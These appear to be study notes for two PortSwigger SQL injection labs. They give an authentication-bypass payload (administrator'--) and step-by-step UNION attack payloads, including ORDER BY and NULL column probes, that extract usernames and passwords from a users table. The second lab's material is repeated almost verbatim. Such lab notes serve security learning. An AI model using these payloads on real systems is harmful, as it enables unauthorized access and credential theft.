# SQL Injection Labs notes

## Lab 1: SQL injection: Authentication bypass

**Link:** [PortSwigger SQL injection labs](https://portswigger.net/web-security/all-labs#sql-injection)

### Assumption:

- username: administrator

### Example query

```sql
select \* from users where username='administrator'--' and password=''
```

### Injection concept

```sql
administrator'--
```

The single quote closes the username string, and the SQL comment marker (`--`) comments out the remainder of the query on databases that support this syntax.

The query could look like:

```sql
SELECT *
FROM users
WHERE username = 'administrator'--' AND password = '';
```

## Lab 2: SQL injection UNION attack: Retrieve data from other tables

**Link:** [Retrieve data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

### Assumptions

- The vulnerable input is the product category filter.
- The relevant table is named `users`.
- The table contains `username` and `password` columns.
- The original query returns two columns, and both can accept text values.

### Step 1 — Determine the number of columns

One approach is to test increasing column positions with `ORDER BY`:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Increase the number until the response indicates an invalid column position. For example, if `ORDER BY 1` and `ORDER BY 2` work but `ORDER BY 3` causes an error, the original result likely has **two columns**.

An alternative is to try `UNION SELECT` with increasing numbers of `NULL` values:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

The number of expressions on both sides of a `UNION` must match.

### Step 2 — Check compatible data types

The corresponding columns in both `SELECT` statements must have compatible data types. `NULL` is useful when testing the column count because it is compatible with many common data types.

If the original query returns two columns and both are text-compatible, the injected query can select two text fields from the `users` table.

### Step 3 — Retrieve the target fields

Example payload for the lab:

```sql
' UNION SELECT username, password FROM users--
```

This appends the `username` and `password` values from `users` to the original query's result set, provided the assumptions above are correct.

### Example query shape

Your original note used a category query like this:

```sql
SELECT *
FROM categoryTable
WHERE category = 'Lifestyle'
UNION
SELECT username, password
FROM users--
```

### Assumptions

- The vulnerable input is the product category filter.
- The relevant table is named `users`.
- The table contains `username` and `password` columns.
- The original query returns two columns, and both can accept text values.

### Step 1: Determine the number of columns

One approach is to test increasing column positions with `ORDER BY`:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Increase the number until the response indicates an invalid column position. For example, if `ORDER BY 1` and `ORDER BY 2` work but `ORDER BY 3` causes an error, the original result likely has **two columns**.

The number of expressions on both sides of a `UNION` must match.

### Step 2: Check compatible data types

The columns in both `SELECT` statements must have compatible data types.

If the original query returns two columns and both are text-compatible, the injected query can select two text fields from the `users` table.

### Step 3: Retrieve the target fields

Example:

```sql
' UNION SELECT username, password FROM users--
```

This adds the `username` and `password` values from `users` to the original query's result set, provided the assumptions above are correct.

### Example query

```sql
SELECT *
FROM categoryTable
WHERE category = 'Lifestyle'
UNION
SELECT username, password
FROM users--
```
